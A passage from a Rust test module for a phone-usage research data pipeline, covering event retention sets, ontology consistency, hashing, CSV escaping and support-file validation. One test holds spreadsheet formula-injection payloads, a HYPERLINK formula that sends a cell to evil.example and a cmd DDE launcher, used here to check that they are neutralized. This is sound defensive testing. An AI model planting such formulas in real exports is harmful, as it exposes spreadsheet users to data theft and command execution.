    }

    /// Every published set retains the event that OPENS an episode. The event
    /// that closes it is not universal, which is the whole reason these sets
    /// are a separate axis rather than a detail of the reconstruction rule.
    #[test]
    fn every_set_retains_the_episode_opening_event() {
        for set in EventRetentionSet::ALL {
            assert!(
                set.retains("Activity Resumed"),
                "{} drops Activity Resumed, which no published rule does",
                set.canonical_id()
            );
        }
        // Parry & Toth are the one exception on the closing half, and they are
        // the reason this is asserted per-label rather than as a blanket claim.
        assert!(!EventRetentionSet::ParryToth.retains("Activity Paused"));
        for set in [
            EventRetentionSet::None,
            EventRetentionSet::UsageLogger,
            EventRetentionSet::TothTrifonova,
            EventRetentionSet::ForegroundBackgroundOnly,
        ] {
            assert!(set.retains("Activity Paused"), "{}", set.canonical_id());
        }
    }

    /// The default retains everything and allocates nothing, which is what makes
    /// the axis additive: with it unset, every golden is byte-identical.
    #[test]
    fn the_default_retention_set_keeps_every_row() {
        let set = EventRetentionSet::default();
        assert_eq!(set, EventRetentionSet::None);
        for label in [
            "Activity Resumed",
            "Activity Paused",
            "Notification Seen",
            "Configuration Change",
            "Locus ID Set",
            "Standby Bucket Changed",
        ] {
            assert!(set.retains(label), "the default must keep {label}");
        }
    }

    #[test]
    fn every_retention_set_round_trips_through_its_canonical_id() {
        for set in EventRetentionSet::ALL {
            assert_eq!(
                EventRetentionSet::from_canonical_id(set.canonical_id()),
                set,
                "{} does not round-trip",
                set.canonical_id()
            );
        }
        // An unknown value is refused rather than read as any set.
        assert!(
            EventRetentionSet::parse_request_value("parry_toth_8")
                .expect_err("an unknown event_retention_set is refused")
                .starts_with("unknown_event_retention_set: "),
        );
    }

    /// The permissible values an ontology enum declares.
    ///
    /// The values are the six-space-indented keys under `permissible_values:`,
    /// and the block ends at the first line indented less than that.
    fn ontology_permissible_values<'a>(ontology: &'a str, enum_name: &str) -> Vec<&'a str> {
        let block = ontology
            .split_once(&format!("  {enum_name}:"))
            .unwrap_or_else(|| panic!("the ontology declares {enum_name}"))
            .1
            .split_once("    permissible_values:")
            .unwrap_or_else(|| panic!("{enum_name} declares permissible values"))
            .1;
        block
            .lines()
            .skip(1)
            .take_while(|line| line.starts_with("      ") || line.trim().is_empty())
            .filter_map(|line| line.trim().split_once(':').map(|(key, _)| key))
            .collect()
    }

    /// Each axis enum's doc comment says its variants ARE the permissible values
    /// of the matching research-ontology enum. That was a claim nothing checked,
    /// and it went false the moment two arms were added to
    /// `EpisodeReconstructionStrategy` without being added to the schema. Now
    /// the claim is enforced in both directions, for every axis.
    ///
    /// Adding a fifth axis costs one row here. Before this was table-driven it
    /// cost a whole new copy of this test, which is why the two newer axes had
    /// no such test at all.
    #[test]
    fn every_axis_arm_is_declared_in_the_research_ontology() {
        const ONTOLOGY: &str =
            include_str!("../../../web/schema/chronicle-research-ontology.linkml.yaml");

        let axes: [(&str, Vec<&'static str>); 5] = [
            (
                "EventRetentionSetId",
                EventRetentionSet::ALL
                    .iter()
                    .map(|arm| arm.canonical_id())
                    .collect(),
            ),
            (
                "ReconstructionStrategyId",
                EpisodeReconstructionStrategy::ALL
                    .iter()
                    .map(|arm| arm.canonical_id())
                    .collect(),
            ),
            (
                "OpenerSetId",
                OpenerSet::ALL
                    .iter()
                    .map(|arm| arm.canonical_id())
                    .collect(),
            ),
            (
                "IntervalQualityPolicyId",
                IntervalQualityPolicy::ALL
                    .iter()
                    .map(|arm| arm.canonical_id())
                    .collect(),
            ),
            (
                "SessionGroupingPolicyId",
                SessionGroupingPolicy::ALL
                    .iter()
                    .map(|arm| arm.canonical_id())
                    .collect(),
            ),
        ];

        for (enum_name, implemented) in axes {
            let declared = ontology_permissible_values(ONTOLOGY, enum_name);
            for arm in &implemented {
                assert!(
                    declared.contains(arm),
                    "{arm} is implemented but is not a {enum_name} permissible \
                     value; declared: {declared:?}"
                );
            }
            for value in &declared {
                assert!(
                    implemented.contains(value),
                    "the ontology declares {value} under {enum_name}, which no \
                     arm implements"
                );
            }
        }
    }

    /// Both hash sinks batch small writes so per-call overhead cannot dominate.
    /// Batching is only allowed to change *where* the byte stream is split
    /// across `update` calls; the digest has to stay the digest of the
    /// concatenation. This is the property that makes every flush-schedule
    /// change in `BufferedCheckpointHasher::checkpoint_update` and
    /// `FingerprintSink::write`/`flush` unobservable, and it is what would
    /// break if a buffered byte were ever dropped, duplicated, or reordered.
    #[test]
    fn the_buffered_checkpoint_hasher_digests_the_concatenation_whatever_the_chunking() {
        let sizes = [
            0,
            1,
            7,
            CHECKPOINT_HASH_BUFFER_BYTES - 1,
            3,
            CHECKPOINT_HASH_BUFFER_BYTES,
            5,
            CHECKPOINT_HASH_BUFFER_BYTES + 1,
            2 * CHECKPOINT_HASH_BUFFER_BYTES,
            11,
        ];
        let mut buffered = BufferedCheckpointHasher::new();
        let mut flat = Vec::new();
        for (chunk_index, size) in sizes.iter().enumerate() {
            let chunk: Vec<u8> = (0..*size)
                .map(|offset| (offset.wrapping_mul(31).wrapping_add(chunk_index)) as u8)
                .collect();
            buffered.checkpoint_update(&chunk);
            flat.extend_from_slice(&chunk);
        }
        let mut unbuffered = Xxh3::new();
        unbuffered.update(&flat);
        assert_eq!(
            buffered.finalize128(),
            unbuffered.digest128(),
            "buffering changed the checkpoint digest of a {}-byte stream",
            flat.len()
        );
    }

    #[test]
    fn the_fingerprint_sink_digests_the_concatenation_whatever_the_chunking() {
        let buffer_bytes = FingerprintSink::new().buffer.len();
        let sizes = [
            0,
            1,
            9,
            buffer_bytes - 1,
            2,
            buffer_bytes,
            4,
            buffer_bytes + 1,
            2 * buffer_bytes,
            13,
        ];
        let mut sink = FingerprintSink::new();
        let mut flat = Vec::new();
        for (chunk_index, size) in sizes.iter().enumerate() {
            let chunk: Vec<u8> = (0..*size)
                .map(|offset| (offset.wrapping_mul(17).wrapping_add(chunk_index)) as u8)
                .collect();
            sink.write(&chunk);
            flat.extend_from_slice(&chunk);
        }
        let mut unbuffered = Xxh3::new();
        unbuffered.update(&flat);
        assert_eq!(
            sink.finish(),
            unbuffered.digest128(),
            "buffering changed the fingerprint of a {}-byte stream",
            flat.len()
        );
    }

    /// The fingerprint protocol tags every value it serializes. A value that
    /// contributed no bytes at all would fingerprint as the empty stream and
    /// so collide with every other such value, which is exactly the collision
    /// the tags exist to prevent.
    #[test]
    fn every_serialized_value_contributes_bytes_to_its_fingerprint() {
        let empty_stream = FingerprintSink::new().finish().to_le_bytes();
        for (label, fingerprint) in [
            (
                "a unit",
                value_fingerprint(&()).expect("fingerprint a unit"),
            ),
            (
                "an empty string",
                value_fingerprint("").expect("fingerprint an empty string"),
            ),
            (
                "an empty vector",
                value_fingerprint(&Vec::<u8>::new()).expect("fingerprint an empty vector"),
            ),
            (
                "an absent option",
                value_fingerprint(&None::<u8>).expect("fingerprint an absent option"),
            ),
        ] {
            assert_ne!(
                fingerprint, empty_stream,
                "{label} fingerprinted as an empty protocol stream"
            );
        }
    }

    /// `emit_csv_i32` short-circuits the two most common values. The fast path
    /// is only sound while it renders byte-for-byte what the general path
    /// would have written.
    #[test]
    fn the_small_integer_csv_fast_path_renders_exactly_like_the_general_path() {
        for value in [i32::MIN, -24, -1, 0, 1, 2, 23, 24, i32::MAX] {
            let mut fast = Vec::new();
            let mut fast_first = true;
            emit_csv_i32(&mut fast, value, &mut fast_first);

            let mut general = Vec::new();
            let mut general_first = true;
            begin_csv_field(&mut general, &mut general_first);
            append_csv_field(&mut general, &value.to_string());

            assert_eq!(
                fast, general,
                "the CSV fast path rendered {value} differently from the general path"
            );
            assert_eq!(fast_first, general_first);
        }
    }

    /// Security X4: the participant-id writer behind the compliance and
    /// day-coverage CSVs quoted `,` `"` `\n` but not a bare `\r`, so one id
    /// carrying a CR split its row in Excel and in Python's `csv` reader.
    #[test]
    fn the_participant_id_writer_quotes_a_bare_carriage_return() {
        assert_eq!(csv_escape_value("P1\rX"), "\"P1\rX\"");
        assert_eq!(csv_escape_value("P1\r\nX"), "\"P1\r\nX\"");
        assert_eq!(csv_escape_value("P1"), "P1");
        assert_eq!(csv_escape_value("P,1"), "\"P,1\"");
        assert_eq!(csv_escape_value("say \"hi\""), "\"say \"\"hi\"\"\"");
        let record = format!("{},2026-03-07,usage\n", csv_escape_value("P1\rX"));
        let rows: Vec<Vec<String>> = csv::ReaderBuilder::new()
            .has_headers(false)
            .from_reader(record.as_bytes())
            .records()
            .map(|row| row.expect("one record").iter().map(str::to_string).collect())
            .collect();
        assert_eq!(rows, [["P1\rX", "2026-03-07", "usage"]]);
    }

    /// Security X3, the cell rule itself: a text cell that a spreadsheet would
    /// evaluate gains one leading `'`; a numeric cell, any other text cell and
    /// every separator keep their exact bytes.
    #[test]
    fn spreadsheet_formula_neutralization_prefixes_text_cells_only() {
        let cases: &[(&str, &str)] = &[
            // The two payloads the launch-audit probe pushed through the app.
            (
                "label,\"=HYPERLINK(\"\"https://evil.example/?d=\"\"&A1;\"\"click\"\")\"\n",
                "label,\"'=HYPERLINK(\"\"https://evil.example/?d=\"\"&A1;\"\"click\"\")\"\n",
            ),
            ("label,+cmd|'/c calc'!A0\n", "label,'+cmd|'/c calc'!A0\n"),
            // Every trigger, unquoted.
            ("=1+1,@SUM(A1),\tx,-x,+x\n", "'=1+1,'@SUM(A1),'\tx,'-x,'+x\n"),
            // Numbers are numbers, not formulas: untouched.
            (
                "-5,+5,-1.5,-.5,-5.,+1.5e3,-2E-7,-0,-Infinity,+Infinity,7,0.25\n",
                "-5,+5,-1.5,-.5,-5.,+1.5e3,-2E-7,-0,-Infinity,+Infinity,7,0.25\n",
            ),
            // Signed text that only starts like a number.
            (
                "-,--,-1-2,-1e,-e5,-.,-Inf,-Infinityx,-1x,+1 2\n",
                "'-,'--,'-1-2,'-1e,'-e5,'-.,'-Inf,'-Infinityx,'-1x,'+1 2\n",
            ),
            // A quoted cell is always text; its first content byte decides.
            (
                "\"-5,3\",\"=a,b\",\"\r=x\",\"\"\"=q\"\"\",\"a,=b\",\"\"\n",
                "\"'-5,3\",\"'=a,b\",\"'\r=x\",\"\"\"=q\"\"\",\"a,=b\",\"\"\n",
            ),
            // Not at the start of a cell: untouched. Dates and ids stay put.
            ("a=b,x-1,2026-03-07,com.example.chat,\n", "a=b,x-1,2026-03-07,com.example.chat,\n"),
            // CRLF terminators and a final record with no newline.
            ("x,-5\r\n=y,\r\n-z", "x,-5\r\n'=y,\r\n'-z"),
            ("a,-5", "a,-5"),
            ("", ""),
        ];
        for (input, expected) in cases {
            let whole = output::neutralize_spreadsheet_formulas(input.as_bytes());
            assert_eq!(
                String::from_utf8(whole.clone()).expect("UTF-8"),
                *expected,
                "neutralizing {input:?}",
            );
            // The filter streams: one byte at a time gives the same bytes as
            // one write, so a payload-chunk boundary cannot change a cell.
            let mut filter = output::SpreadsheetFormulaNeutralizer::new(Vec::new());
            for byte in input.as_bytes() {
                std::io::Write::write_all(&mut filter, std::slice::from_ref(byte))
                    .expect("Vec writer");
            }
            assert_eq!(filter.finish().expect("Vec writer"), whole, "chunked {input:?}");
            // A neutralized cell starts with `'`, so a second pass is a no-op.
            assert_eq!(output::neutralize_spreadsheet_formulas(&whole), whole);
        }

        // Decoded by a real CSV reader, every cell is the original or `'`
        // followed by the original, and the record shape never changes.
        let original = "p,\"=HYPERLINK(\"\"x\"\")\",-12.5,\"a,b\",-x\n=q,1,-0.5,@y,\"\r\"\n";
        let decode = |bytes: &[u8]| -> Vec<Vec<String>> {
            csv::ReaderBuilder::new()
                .has_headers(false)
                .from_reader(bytes)
                .records()
                .map(|row| row.expect("record").iter().map(str::to_string).collect())
                .collect()
        };
        let before = decode(original.as_bytes());
        let after = decode(&output::neutralize_spreadsheet_formulas(original.as_bytes()));
        assert_eq!(
            after,
            [
                ["p", "'=HYPERLINK(\"x\")", "-12.5", "a,b", "'-x"],
                ["'=q", "1", "-0.5", "'@y", "'\r"],
            ]
        );
        assert_eq!(before.len(), after.len());
    }

    /// JS `parseFloat(value.toPrecision(n))` returns the input unchanged for
    /// the non-finite and zero cases, including the sign of a negative zero —
    /// which the CSV writer would otherwise render as `-0` instead of `0`.
    #[test]
    fn rounding_to_significant_digits_keeps_the_javascript_edge_cases() {
        assert!(
            round_to_precision(-0.0, 4).is_sign_negative(),
            "rounding lost the sign of a negative zero"
        );
        assert!(round_to_precision(0.0, 4).is_sign_positive());
        assert!(round_to_precision(f64::NAN, 4).is_nan());
        assert_eq!(round_to_precision(f64::INFINITY, 4), f64::INFINITY);
        assert_eq!(round_to_precision(f64::NEG_INFINITY, 4), f64::NEG_INFINITY);
        assert_eq!(round_to_precision(1.0 / 3.0, 4), 0.3333);
        assert_eq!(round_to_precision(-1.0 / 3.0, 4), -0.3333);
    }

    /// `ecma_round_fixed_f64` decodes subnormals through a separate exponent
    /// branch, whose exponent is at most `-1074`. The scaled mantissa is a
    /// `u128`, so it is below `2^128` and the right shift by more than 128
    /// bits drives every subnormal to zero — at every precision the `u128`
    /// scale can represent, and for any exponent within a hundred-odd bits of
    /// the real one.
    #[test]
    fn subnormals_round_to_zero_at_every_precision_the_scale_admits() {
        for value in [
            f64::from_bits(1),
            f64::from_bits(1 << 26),
            f64::MIN_POSITIVE / 2.0,
            -f64::MIN_POSITIVE / 2.0,
        ] {
            for frac_digits in [0_u32, 2, 9, 22] {
                let rounded = ecma_round_fixed_f64(value, frac_digits);
                assert_eq!(
                    rounded, 0.0,
                    "subnormal {value:e} did not round to zero at {frac_digits} digits"
                );
            }
        }
    }

    /// A span that only touches the window edge contributes no credited time,
    /// so whether the scan stops before or after it cannot change the result.
    #[test]
    fn clipping_alive_spans_drops_the_spans_that_only_touch_the_window_edges() {
        let spans: Vec<CreditInterval> = vec![(0, 5), (5, 10), (10, 20), (20, 30), (30, 40)];
        assert_eq!(
            clip_alive_spans(&spans, 10, 20),
            vec![(10, 20)],
            "a span ending at the window start or starting at the window end was credited"
        );
        assert_eq!(clip_alive_spans(&spans, 12, 18), vec![(12, 18)]);
        assert_eq!(clip_alive_spans(&spans, 5, 10), vec![(5, 10)]);
        assert!(clip_alive_spans(&spans, 40, 50).is_empty());
        assert!(clip_alive_spans(&[], 0, 10).is_empty());
    }

    #[test]
    fn support_role_validation_uses_real_headers_and_value_parsers() {
        assert!(validate_support_csv(
            "filter_file",
            b"app_package_name,known_application_labels\ncom.example,Example\n",
        )
        .is_ok());
        assert!(
            validate_support_csv("filter_file", b"unrelated,value\ncom.example,Example\n",)
                .unwrap_err()
                .contains("requires one of columns")
        );
        assert!(validate_support_csv(
            "filter_file",
            b"App_Package_Name,known_application_labels\ncom.example,Example\n",
        )
        .unwrap_err()
        .contains("requires one of columns"));
        assert!(validate_support_csv(
            "filter_file",
            b"app_package_name,known_application_labels\ncom.example,\xff\n",
        )
        .unwrap_err()
        .contains("malformed CSV record"));
        assert!(validate_support_csv(
            "device_sharing_file",
            b"participant_id,sharing_status\nP01,Maybe\n",
        )
        .unwrap_err()
        .contains("unknown sharing_status"));
        assert!(validate_support_csv(
            "study_dates_file",
            b"participant_id,start_date,end_date\nP01,2026-03-08,2026-03-07\n",
        )
        .unwrap_err()
        .contains("before it starts"));
        assert!(validate_support_csv(
            "call_sms_eligibility_file",
            b"participant_id,modality_scope,availability_state,year_equivalent_exposure_numerator,year_equivalent_exposure_denominator\nP01,call_text_combined,available,299,1\nP02,call,unavailable,,\nP03,call,available,,\n",
        )
        .is_ok());
        assert!(validate_support_csv(
            "call_sms_eligibility_file",
            b"participant_id,modality_scope,availability_state,year_equivalent_exposure_numerator,year_equivalent_exposure_denominator\nP01,call_text_combined,available,299,0\n",
        )
        .unwrap_err()
        .contains("require positive integer"));
        assert!(validate_support_csv(
            "call_sms_eligibility_file",
            b"participant_id,modality_scope,availability_state,year_equivalent_exposure_numerator,year_equivalent_exposure_denominator\nP01,call,unavailable,0,1\n",
        )
        .unwrap_err()
        .contains("require blank"));
        assert!(validate_support_csv(
            "call_sms_eligibility_file",
            b"participant_id,modality_scope,availability_state,year_equivalent_exposure_numerator,year_equivalent_exposure_denominator\nP01,call,available,,\nP01,call,unavailable,,\n",
        )
        .unwrap_err()
        .contains("duplicate participant_id and modality_scope"));
    }

    #[test]
    fn every_support_role_enforces_its_own_required_columns() {
        // One accepted and one rejected file per role, so no role's schema
        // check can be dropped without failing here. A correctly named CSV
        // with unrelated columns used to qualify and then behave like an empty
        // lookup, which is the defect this validation exists to stop.
        let cases: &[(&str, &[u8], &[u8], &str)] = &[
            (
                "filter_file",
                b"app_package_name\ncom.example.chat\n",
                b"unrelated\ncom.example.chat\n",
                "requires one of columns",
            ),
            (
                "apps_forcing_screen_open_file",
                b"package_name\ncom.example.video\n",
                b"unrelated\ncom.example.video\n",
                "requires one of columns",
            ),
            (
                "background_apps_file",
                b"app_package_name\ncom.example.sync\n",
                b"unrelated\ncom.example.sync\n",
                "requires one of columns",
            ),
            (
                "app_codebook_file",
                b"app_package_name,bcm_play_store_broad_app_category\ncom.example.chat,Social\n",
                b"package_name,bcm_play_store_broad_app_category\ncom.example.chat,Social\n",
                "missing required column(s) app_package_name",
            ),
            (
                "study_dates_file",
                b"participant_id,start_date,end_date\nP01,2026-03-07,2026-03-08\n",
                b"participant_id,start_date\nP01,2026-03-07\n",
                "missing required column(s) end_date",
            ),
            (
                "device_sharing_file",
                b"participant_id,sharing_status\nP01,Non-Shared\n",
                b"participant_id\nP01\n",
                "missing required column(s) sharing_status",
            ),
            (
                "survey_attribution_file",
                b"participant_id,event_timestamp,users\nP01,2026-03-07 10:00:00,Target Child\n",
                b"participant_id,event_timestamp\nP01,2026-03-07 10:00:00\n",
                "missing required column(s) users",
            ),
            (
                "enrolled_devices_file",
                b"participant_id,device_count\nP01,1\n",
                b"participant_id\nP01\n",
                "missing required column(s) device_count",
            ),
            (
                "analysis_feature_matrix_file",
                b"participant_id,feature_id,value,missing_state,feature_set_id\nP01,screen_time::week_01,1,observed,phone_usage\n",
                b"participant_id,feature_id,value,missing_state\nP01,screen_time::week_01,1,observed\n",
                "missing required column(s) feature_set_id",
            ),
            (
                "call_sms_eligibility_file",
                b"participant_id,modality_scope,availability_state,year_equivalent_exposure_numerator,year_equivalent_exposure_denominator\nP01,call_text_combined,available,299,1\nP02,call,unavailable,,\n",
                b"participant_id,modality_scope,availability_state,year_equivalent_exposure_numerator\nP01,call_text_combined,available,299\n",
                "missing required column(s) year_equivalent_exposure_denominator",
            ),
            (
                "phonestudy_ps_communication_file",
                b"id,contact_hash\nc-1,peer-a\n",
                b"communication_id,contact_hash\nc-1,peer-a\n",
                "missing required column(s) id",
            ),
            (
                "phonestudy_es_file",
                b"user_id,es_questionnaire_id\nu-1,es-1\n",
                b"participant_id,questionnaire_id\nu-1,es-1\n",
                "missing required column(s) user_id, es_questionnaire_id",
            ),
            (
                "anchor_events_file",
                b"participant_id,anchor_timestamp\nu-1,2026-01-01 12:00:00\n",
                b"participant_id,event_timestamp\nu-1,2026-01-01 12:00:00\n",
                "missing required column(s) anchor_timestamp",
            ),
        ];
        for (role, accepted, rejected, expected_error) in cases {
            validate_support_csv(role, accepted)
                .unwrap_or_else(|error| panic!("{role} must accept its own schema: {error}"));
            let error = validate_support_csv(role, rejected)
                .expect_err("a file that cannot satisfy the role must be rejected");
            assert!(
                error.starts_with(&format!("{role}: ")) && error.contains(expected_error),
                "{role} produced the wrong rejection: {error}",
            );
        }
        assert!(validate_support_csv("not_a_role", b"anything\n")
            .unwrap_err()
            .contains("unsupported support role"));
    }

    /// The device-sharing and survey files are read again during processing,
    /// not just at upload time, and each parser is the last chance to catch a
    /// file that qualified on its header but cannot be used. Sharing status is
    /// written several ways by hand, timestamps arrive in seconds,
    /// milliseconds, nanoseconds or as text, and a row with no answer must be
    /// dropped rather than recorded as an empty user.
    #[test]
    fn support_parsers_reject_unusable_files_and_accept_every_written_form() {
        let sharing = parse_device_sharing(
            concat!(
                "participant_id,sharing_status\n",
                "P01,Shared\n",
                "P02,Non-Shared\n",
                "P03,nonshared\n",
                "P04,not shared\n",
                "P05,SHARED\n",
                " ,Shared\n",
            )
            .as_bytes(),
        )
        .expect("every written sharing status parses");
        assert_eq!(
            sharing
                .iter()
                .map(|entry| (entry.participant_id.as_str(), entry.status))
                .collect::<Vec<_>>(),
            vec![
                ("P01", SharingStatus::Shared),
                ("P02", SharingStatus::NonShared),
                ("P03", SharingStatus::NonShared),
                ("P04", SharingStatus::NonShared),
                ("P05", SharingStatus::Shared),
            ],
            "a blank participant is skipped and every spelling maps to a status",
        );
        let unknown = parse_device_sharing(b"participant_id,sharing_status\nP01,maybe\n")
            .expect_err("an unknown status must not be guessed");
        assert!(
            unknown.contains("unknown sharing_status for P01"),
            "{unknown}"
        );
        let missing = parse_device_sharing(b"participant_id\nP01\n")
            .expect_err("a file without sharing_status cannot be used");
        assert_eq!(
            missing,
            "Device sharing file: missing required column(s) sharing_status",
        );

        // Ten digits are seconds, thirteen are milliseconds, nineteen are
        // nanoseconds, and anything else goes through the Chronicle timestamp
        // parser. All four describe the same instant here.
        let expected = 1_772_000_000_000_000_000_i64;
        assert_eq!(
            parse_survey_timestamp_ns("1772000000").expect("seconds"),
            expected
        );
        assert_eq!(
            parse_survey_timestamp_ns("1772000000000").expect("milliseconds"),
            expected,
        );
        assert_eq!(
            parse_survey_timestamp_ns(" 1772000000000000000 ").expect("nanoseconds"),
            expected,
        );
        assert!(
            parse_survey_timestamp_ns("123456789").is_err(),
            "nine digits is not a timestamp"
        );
        assert!(parse_survey_timestamp_ns("not a timestamp").is_err());

        let lookup = parse_survey_lookup(
            concat!(
                "participant_id,event_timestamp,users\n",
                "P01,1772000000,\"{Target Child}\"\n",
                "P02,1772000000000,Parent\n",
                "P03,1772000000,\n",
                ",1772000000,Target Child\n",
                "P04,,Target Child\n",
            )
            .as_bytes(),
        )
        .expect("survey rows parse");
        assert_eq!(
            lookup,
            BTreeMap::from([
                (("P01".to_string(), expected), "Target Child".to_string()),
                (("P02".to_string(), expected), "Parent".to_string()),
            ]),
            "a row missing any of the three values is dropped, not stored blank",
        );
        assert!(parse_survey_lookup(b"").expect("no file at all").is_empty());
        let missing = parse_survey_lookup(b"participant_id,event_timestamp\nP01,1772000000\n")
            .expect_err("a file without users cannot attribute anything");
        assert_eq!(
            missing,
            "Survey attribution file: missing required column(s) users",
        );
        let unparseable = parse_survey_lookup(
            b"participant_id,event_timestamp,users\nP01,not a timestamp,Target Child\n",
        )
        .expect_err("an unparseable timestamp is named by participant");
        assert!(unparseable.contains("(participant P01)"), "{unparseable}");
        assert!(!unparseable.contains("not a timestamp"), "{unparseable}");
    }

    #[test]
    fn study_dates_validation_requires_at_least_one_usable_participant_window() {
        // The row counter and the parsed-window check are separate gates: an
        // all-blank data row counts as no rows, and a header-only file has no
        // windows. Either one alone must reject the file.
        assert_eq!(
            validate_support_csv(
                "study_dates_file",
                b"participant_id,start_date,end_date\n,,\n",
            )
            .unwrap_err(),
            "study_dates_file: no participant study windows found",
        );
        assert_eq!(
            validate_support_csv("study_dates_file", b"participant_id,start_date,end_date\n")
                .unwrap_err(),
            "study_dates_file: no participant study windows found",
        );
        // A row with dates but no participant is a real data row that still
        // produces no window, so the two gates have to be checked separately.
        assert_eq!(
            validate_support_csv(
                "study_dates_file",
                b"participant_id,start_date,end_date\n,2026-03-07,2026-03-08\n",
            )
            .unwrap_err(),
            "study_dates_file: no participant study windows found",
        );
        validate_support_csv(
            "study_dates_file",
            b"participant_id,start_date,end_date\n,,\nP01,2026-03-07,2026-03-08\n",
        )
        .expect("one usable window is enough");
    }

    /// Study-dates files arrive with either ISO or US dates, and their
    /// participant IDs rarely match the raw data exactly - a tablet exports
    /// `TECH-1042-D2` where the study file says `1042`. The numerical fallback
    /// is what links them, so it has to accept a real ID run and refuse a
    /// coincidental pair of digits.
    #[test]
    fn support_dates_and_participant_ids_are_read_the_way_study_files_write_them() {
        assert_eq!(
            normalize_support_date("2026-03-07T08:00:00Z").expect("ISO prefix"),
            "2026-03-07",
        );
        assert_eq!(
            normalize_support_date(" 3/7/2026 ").expect("US date"),
            "2026-03-07"
        );
        // Ten characters are not a date on their own: both separators have to
        // be in place before the prefix is trusted.
        assert!(normalize_support_date("2026-03/07").is_err());
        assert!(normalize_support_date("2026/03-07").is_err());
        for impossible in ["2026-02-29", "2/29/2026"] {
            assert_eq!(
                normalize_support_date(impossible).expect_err("impossible calendar date"),
                "unparseable date value",
            );
        }
        // Byte 10 of this cell is inside a character; it is refused, not a
        // panic. A two-digit year, month 13 and day 0 are refused rather than
        // becoming a window no row can fall in.
        for value in ["2026\u{5e74}01\u{6708}05\u{65e5}", "1/5/26", "13/5/2026", "1/0/2026", "2026-13-01", "abcd-ef-gh"] {
            assert_eq!(
                normalize_support_date(value).expect_err("not a date"),
                "unparseable date value"
            );
        }
        // A slash date needs all three parts, and none of the errors may echo
        // the cell.
        for value in ["03/07", "03/07/2026/01", "March 7 2026", ""] {
            let error = normalize_support_date(value).expect_err("not a date");
            assert_eq!(error, "unparseable date value");
        }

        // A numerical ID is a run of at least three digits, anywhere in the
        // string, including at its end.
        assert_eq!(numerical_id("TECH-1042-D2"), Some("1042"));
        assert_eq!(numerical_id("participant 1042"), Some("1042"));
        assert_eq!(numerical_id("1042"), Some("1042"));
        assert_eq!(numerical_id("P01-D2"), None);
        assert_eq!(numerical_id("ab12cd"), None);
        assert_eq!(numerical_id("ab12"), None);
        assert_eq!(numerical_id("no digits"), None);
        assert_eq!(
            matching_study_participant_id("TECH-1042-D2", ["1042", "TECH-1042-D2"].into_iter(),),
            Some("TECH-1042-D2"),
            "an exact candidate wins even when a numerical alias appears first",
        );

        let windows = vec![
            StudyWindow {
                participant_id: "1042".to_string(),
                start_date: "2026-03-01".to_string(),
                end_date: "2026-03-31".to_string(),
                exclusions: Vec::new(),
            },
            StudyWindow {
                participant_id: "TECH-2001-D1".to_string(),
                start_date: "2026-04-01".to_string(),
                end_date: "2026-04-30".to_string(),
                exclusions: Vec::new(),
            },
        ];
        assert_eq!(
            window_for("TECH-1042-D2", &windows).map(|window| window.start_date.as_str()),
            Some("2026-03-01"),
            "a device-suffixed ID falls back to its numerical run",
        );
        assert_eq!(
            window_for("TECH-2001-D1", &windows).map(|window| window.start_date.as_str()),
            Some("2026-04-01"),
            "an exact ID match wins",
        );
        assert!(
            window_for("TECH-9999-D1", &windows).is_none(),
            "an unrelated numerical run must not borrow another participant's window",
        );
        assert!(window_for("P01", &windows).is_none());

        // The per-participant resolution the study-window step runs walks the
        // rows once and applies the same rule, so it is checked on rows.
        let mut rows = rows_from_events(&[
            (
                "2026-03-07 10:00:00",
                "Activity Resumed",
                "com.example.chat",
            ),
            (
                "2026-03-07 10:01:00",
                "Activity Resumed",
                "com.example.chat",
            ),
            (
                "2026-03-07 10:02:00",
                "Activity Resumed",
                "com.example.chat",
            ),
        ]);
        for (row, participant) in
            rows.iter_mut()
                .zip(["TECH-1042-D2", "TECH-9999-D1", "TECH-1042-D2"])
        {
            row.edit_all().participant_id = participant.into();
        }
        assert_eq!(
            resolve_participant_windows(&rows, &windows)
                .iter()
                .map(|entry| (
                    entry.participant_id.as_str(),
                    entry
                        .window
                        .as_ref()
                        .map(|window| window.start_date.as_str()),
                ))
                .collect::<Vec<_>>(),
            vec![("TECH-1042-D2", Some("2026-03-01")), ("TECH-9999-D1", None),],
            "each participant is resolved once, by exact ID then numerical run",
        );
    }

    #[test]
    fn filter_file_parsing_scopes_relabeling_to_the_listed_labels() {
        let parsed = parse_filter_csv(
            concat!(
                "app_package_name,known_application_labels\n",
                "com.example.chat,\" Chat , Chat Beta ,\"\n",
                "com.example.any,\n",
                ",Orphan\n",
            )
            .as_bytes(),
            PackageExclusionPreset::AllSuppliedRows,
            FilterMatchField::AppPackageName,
        );
        assert_eq!(
            parsed.packages.len(),
            2,
            "a blank package must not create an entry"
        );
        assert_eq!(
            parsed.packages["com.example.chat"]
                .iter()
                .cloned()
                .collect::<BTreeSet<_>>(),
            BTreeSet::from(["Chat".to_string(), "Chat Beta".to_string()]),
            "each listed label is trimmed and kept; empty segments are dropped",
        );
        assert!(
            parsed.packages["com.example.any"].is_empty(),
            "an empty label list means the package matches every label",
        );
    }

    #[test]
    fn filter_relabeling_respects_the_label_scope_and_the_stop_event_vocabulary() {
        // Same package, two labels: only the listed one may be relabeled, and
        // only the four session-bearing interaction types are rewritten.
        let filter_map = parse_filter_csv(
            b"app_package_name,known_application_labels\ncom.example.chat,Chat\n",
            PackageExclusionPreset::AllSuppliedRows,
            FilterMatchField::AppPackageName,
        );
        let rows = |interaction: &str, label: &str| {
            let csv = format!(
                concat!(
                    "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
                    "Study,P01,Target Child,{},{},com.example.chat,2026-03-07 10:00:00,UTC\n",
                ),
                label, interaction,
            );
            let raw = incremental::decode_source_records(csv.as_bytes());
            let model = incremental::attach_device_models(&raw);
            let rows = incremental::canonicalize_source_rows(&raw, "UTC", &BTreeMap::new(), &model)
                .expect("canonical rows");
            label_filtered_apps(rows, &filter_map)
        };

        for (interaction, relabeled) in [
            ("Activity Resumed", FILTERED_RESUMED),
            ("Activity Paused", FILTERED_PAUSED),
            ("Activity Stopped", FILTERED_STOPPED),
            ("Activity Destroyed", "Filtered App Destroyed"),
        ] {
            assert_eq!(
                rows(interaction, "Chat")[0].interaction_type.as_str(),
                relabeled,
                "{interaction} for a listed label must be relabeled",
            );
            assert_eq!(
                rows(interaction, "Other")[0].interaction_type.as_str(),
                interaction,
                "{interaction} for an unlisted label must be left alone",
            );
        }
        assert_eq!(
            rows("User Interaction", "Chat")[0]
                .interaction_type
                .as_str(),
            "User Interaction",
            "a non-session interaction type is never relabeled",
        );
    }

    #[test]
